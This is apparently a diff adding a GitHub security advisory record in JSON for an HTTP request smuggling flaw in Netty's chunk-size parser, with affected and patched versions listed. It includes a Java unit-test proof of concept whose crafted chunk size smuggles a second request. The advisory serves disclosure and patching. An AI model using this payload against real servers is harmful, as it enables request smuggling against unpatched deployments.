@@ -1,0 +1,56 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-05-07T00:13:07Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.netty:netty-codec-http"
+  },
+  "Advisory": {
+    "DatabaseId": 353740,
+    "Id": "GSA_kwCzR0hTQS1tNGN2LWoycHgtNzcyM84ABWXM",
+    "GhsaId": "GHSA-m4cv-j2px-7723",
+    "References": [
+      {
+        "Url": "https://github.com/netty/netty/security/advisories/GHSA-m4cv-j2px-7723"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-m4cv-j2px-7723"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-m4cv-j2px-7723"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-42580"
+      }
+    ],
+    "Description": "### Summary\nNetty's chunk size parser silently overflows int, enabling request smuggling attacks.\n\n### Details\nio.netty.handler.codec.http.HttpObjectDecoder#getChunkSize silently overflows int.\n\nThe size is accumulated as follows:\n\nresult *= 16;\nresult += digit;\n\nThe result is checked only for negative values. However, with a carefully crafted chunk size, the result can be a valid size.\n\n### PoC\nThe test below shows Netty successfully parsing the second request, demonstrating how an attacker can smuggle a second request inside a chunked body.\n\n```java\n@Test\npublic void test() {\n    String requestStr = \"POST / HTTP/1.1\\r\\n\" +\n            \"Host: localhost\\r\\n\" +\n            \"Transfer-Encoding: chunked\\r\\n\\r\\n\" +\n            \"100000004\\r\\n\" +\n            \"test\\r\\n\" +\n            \"0\\r\\n\" +\n            \"\\r\\n\" +\n            \"GET /smuggled HTTP/1.1\\r\\n\" +\n            \"Host: localhost\\r\\n\" +\n            \"Content-Length: 0\\r\\n\" +\n            \"\\r\\n\";\n\n    EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());\n    assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));\n\n    // Request 1\n    HttpRequest request = channel.readInbound();\n    assertTrue(request.decoderResult().isSuccess());\n    HttpContent content = channel.readInbound();\n    assertTrue(content.decoderResult().isSuccess());\n    assertEquals(\"test\", content.content().toString(CharsetUtil.US_ASCII));\n    content.release();\n    LastHttpContent last = channel.readInbound();\n    assertTrue(last.decoderResult().isSuccess());\n    last.release();\n\n    // Request 2\n    request = channel.readInbound();\n    assertTrue(request.decoderResult().isSuccess());\n    last = channel.readInbound();\n    assertTrue(last.decoderResult().isSuccess());\n    last.release();\n}\n```\n\n### Impact\nHTTP Request Smuggling: Attacker injects arbitrary HTTP requests",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-07T00:13:05Z",
+    "Severity": "MODERATE",
+    "Summary": "Netty vulnerable to HTTP Request Smuggling due to incorrect chunk size parsing",
+    "UpdatedAt": "2026-05-07T00:13:07Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 6.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.1.133.Final"
+      },
+      "VulnerableVersionRange": "\u003c= 4.1.132.Final"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.2.13.Final"
+      },
+      "VulnerableVersionRange": "\u003e= 4.2.0.Alpha1, \u003c= 4.2.12.Final"
+    }
+  ]
+}
